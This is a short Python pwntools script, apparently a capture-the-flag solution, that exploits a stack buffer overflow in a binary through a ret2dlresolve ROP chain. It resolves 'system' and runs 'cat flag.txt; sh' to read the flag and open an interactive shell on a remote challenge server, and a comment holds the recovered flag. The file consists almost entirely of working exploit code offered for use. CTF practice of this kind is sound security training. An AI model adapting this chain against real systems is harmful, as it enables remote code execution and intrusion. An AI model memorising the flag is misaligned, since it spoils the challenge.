from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

elf = ELF('./vuln')
rop = ROP(elf)
# io = process('./vuln')
# io = gdb.debug('./vuln', 'b *(main+35)\nc')
io = remote('eth007.me', 42044)

rop.raw(0x40101a)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned; ls; cat flag.txt; sh"])
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
print(rop.dump())
io.sendline(flat({72: raw_rop})+b'\n'+dlresolve.payload)
print(dlresolve.unreliable)
io.interactive()
# ictf{the_puts_m4de_all_the_difference_9be1d9f3}
